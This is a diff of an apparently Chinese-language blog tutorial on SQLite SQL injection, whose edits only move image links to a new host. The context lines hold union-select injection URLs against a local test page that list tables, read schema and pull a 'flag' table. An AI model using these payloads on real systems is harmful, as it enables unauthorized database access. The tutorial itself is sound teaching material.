@@ -145,17 +145,17 @@ echo $data[&#39;hex&#39;];</code></pre>
 <li>可以看到记录了表名，表结构，那么我们就可以直接通过这个隐藏表来查询sqlite数据库里面的表名。</li>
 </ul>
 <pre><code class="url">http://127.0.0.1/?id=-1&#39; union select 1,(select group_concat(name)from sqlite_master)--+</code></pre>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191004/15701606229929.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191004/15701606229929.png" alt="img"></p>
 <ul>
 <li>查看表结构<pre><code class="url">http://127.0.0.1/?id=-1&#39; union select 1,(select group_concat(sql)from sqlite_master where name=&#39;flag&#39;)--+</code></pre>
 </li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191004/15701607258796.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191004/15701607258796.png" alt="img"></p>
 <ul>
 <li>查看数据<pre><code class="url">http://127.0.0.1/?id=-1&#39; union select 1,(select group_concat(flag)from flag where id=&#39;1&#39;)--+</code></pre>
 </li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191004/15701608704994.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191004/15701608704994.png" alt="img"></p>
 <ul>
 <li>写文件(实验失败)</li>
 </ul>
@@ -356,7 +356,7 @@ inject.tables_count()</code></pre>
 <ul>
 <li>测试效果</li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191004/15701919083104.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191004/15701919083104.png" alt="img"></p>
 
 	</div>
 	<div class="meta split">
